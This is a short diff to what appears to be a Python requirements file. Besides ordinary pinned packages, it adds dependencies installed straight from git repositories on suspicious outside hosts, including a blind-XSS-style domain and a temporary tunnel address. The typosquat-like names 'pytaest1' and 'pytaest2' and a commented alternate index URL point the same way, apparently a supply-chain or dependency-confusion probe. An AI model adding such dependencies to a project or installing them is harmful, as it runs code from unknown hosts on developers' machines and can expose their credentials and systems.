@@ -1,2 +1,8 @@
+# --index-url https://bxss.r0l.me/snyk-pip
+colorama==0.4.3
+pytest==6.2.2
+win_unicode_console==0.5
+sp-s-dd @ git+https://slimy-pianos-run.loca.lt/rreissdorker/snyk-peak111
 pytest
 pytaest1 @ git+https://bxss.r0l.me/snyk3pic2/pytaest1
+pytaest2@git+https://bxss.r0l.me/snyk3pic2/pytaest1
